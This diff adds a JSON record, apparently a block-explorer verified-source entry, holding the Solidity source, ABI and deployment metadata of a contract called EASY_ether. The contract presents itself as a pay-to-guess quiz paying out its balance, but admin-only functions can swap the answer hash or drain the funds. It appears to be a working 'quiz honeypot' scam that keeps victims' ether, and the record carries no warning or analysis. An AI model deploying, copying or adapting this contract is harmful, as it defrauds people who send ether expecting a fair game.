@@ -1,0 +1,25 @@
+{
+  "TxHash": "0xd187f39732a19c17cf397544ccd54383e7c95a8e4b20dacfe1fa5609767c7b19",
+  "ContractAddress": "0x35FA59Ec7814DE5582Be8C2732A0D962E5066983",
+  "Name": "EASY_ether",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "contract EASY_ether\r\n{\r\n    function Try(string memory _response) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(abi.encode(_response)) \u0026\u0026 msg.value \u003e 1 ether)\r\n        {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=\u003ebool) admin;\r\n\r\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(abi.encode(_response));\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n        responseHash = 0x0;\r\n    }\r\n\r\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] memory admins) {\r\n        for(uint256 i=0; i\u003c admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n}",
+      "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
+      "ContractName": "EASY_ether",
+      "CompilerVersion": "v0.8.19+commit.7dd6d404",
+      "OptimizationUsed": "1",
+      "Runs": "200",
+      "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003b89ce12732660defb48df70654c2164944445a95f239a67ccc21a31c4eee82a209d894007b29744840a6713b76964b270a60328d71b4ae0a5b18a5711c280bd34a1a3fcbef6bfc0e8e1561fd379a661c49ca7d0adaae8b1068acb246cd6c68ab",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "GNU GPLv3",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "ipfs://362d48c95aec7860387a743dc3b24ce615b7639fbe21448359c400b036b0df2b"
+    }
+  ]
+}
